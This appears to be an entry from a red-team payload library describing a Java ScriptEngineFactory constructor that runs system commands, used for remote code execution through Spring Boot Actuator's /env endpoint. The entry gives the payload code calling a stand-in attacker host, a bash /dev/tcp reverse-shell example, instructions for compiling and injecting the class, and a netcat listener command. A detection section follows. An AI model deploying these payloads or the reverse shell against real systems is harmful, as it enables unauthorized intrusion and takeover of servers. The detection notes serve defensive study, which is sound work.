---
type: code
language: Java
verified: true
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Java
tags:
  - rce
  - payload
  - spring-boot
validated: true
---

# Java-AwesomeScriptEngineFactory-RCE

## Code

```java
public AwesomeScriptEngineFactory() {
    try {
        Runtime.getRuntime().exec("ping rce.poc.attacker.example"); // COMMAND HERE
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

## Description

This Java code defines a malicious constructor for the AwesomeScriptEngineFactory class. When the class is instantiated—such as during dynamic loading by a ScriptEngineManager or property resolution in a vulnerable Spring Boot application—it executes an arbitrary system command using Runtime.getRuntime().exec(). This is the core payload for RCE exploits targeting insecure Actuator endpoints like /env, where environment variables can trigger factory loading.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| COMMAND | The system command to execute in the constructor; replace the hardcoded string in exec() | "ping -c 1 attacker.com" or "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" |

## Usage

Compile this code into a .class file (javac AwesomeScriptEngineFactory.java) and ensure it's accessible to the target's classpath, or serialize/encode it for dynamic injection via environment variables. In the Spring Boot Actuator /env exploit, set an environment property (e.g., via POST) to reference or load this factory, such as a value pointing to the class name. Trigger execution by accessing /env or reloading properties. Use in red team scenarios for initial RCE on Java web apps; start a listener (e.g., nc -lvnp 4444) if using a reverse shell command.

## Detection

- JVM logs for ScriptEngineFactory instantiations or unexpected class loadings (enable -verbose:class).
- Application logs showing Runtime.exec() calls or IOException from the catch block.
- System-level monitoring for executed commands (e.g., process creation via Sysmon or auditd).
- Network indicators like outbound pings or TCP connections to attacker IPs/ports.
- Environment property scans in Actuator responses for suspicious factory references.

## Related

- [[procedures/Spring-Boot-Actuator-RCE-via-Env-Endpoint]]
